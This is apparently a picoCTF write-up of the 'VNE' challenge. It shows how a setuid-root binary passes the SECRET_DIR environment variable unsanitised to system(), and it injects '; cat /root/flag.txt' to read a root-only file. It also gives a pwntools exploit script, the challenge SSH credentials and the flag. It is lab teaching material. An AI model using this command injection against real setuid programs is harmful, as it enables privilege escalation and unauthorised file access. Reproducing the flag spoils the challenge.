# VNE

## Challenge

The challenge description is as follows:

> We've got a binary that can list directories as root, try it out !!
> ssh to saturn.picoctf.net:65169, and run the binary named "bin" once connected.
> Login as ctf-player with the password, 3f39b042

We are given credentials to connect to a server via SSH.

In our home directory, there is a single file:

```
ctf-player@pico-chall$ ls -l
total 20
-rwsr-xr-x 1 root root 18752 Mar 16 01:59 bin
```

It is a set-uid binary which will run as root.

If we run the binary, we get the following error:

```
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
```

Setting this variable to a directory allows us to list files in the directory as if we were root:

```
ctf-player@pico-chall$ ls /root
ls: cannot open directory '/root': Permission denied
```

```
ctf-player@pico-chall$ SECRET_DIR="/root" ./bin
Listing the content of /root as root: 
flag.txt
```

However, we cannot read files like this, so we cannot simply read /root/flag.txt.

## Solution

We can download the binary from the server to analyze it for vulnerabilities.

Loading it into Ghidra, we see that it is a simple C++ binary which reads a string from the `SECRET_DIR` environment variable, prepends "ls " to it, then passes the result to `system`.

This results in a trivial command-line injection vulnerability.
We can end the `ls` command with a semicolon and insert our own shell commands, which will also be run as root.

```
ctf-player@pico-chall$ SECRET_DIR="/challenge; cat /root/flag.txt" ./bin
Listing the content of /challenge; cat /root/flag.txt as root: 
config-box.py  metadata.json  profile
picoCTF{Power_t0_man!pul4t3_3nv_1670f174}
```

## Exploit

```py
#!/usr/bin/env python3

from pwn import *

host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 59474)
username = 'ctf-player'
password = '3f39b042'

s = ssh(host=host, port=port, user=username, password=password)
io = s.process('/bin/sh', env={'PS1':''})
io.sendline(b"SECRET_DIR='.; cat /root/flag.txt' ./bin")

io.interactive()
```

## Flag

```
picoCTF{Power_t0_man!pul4t3_3nv_1670f174}
```
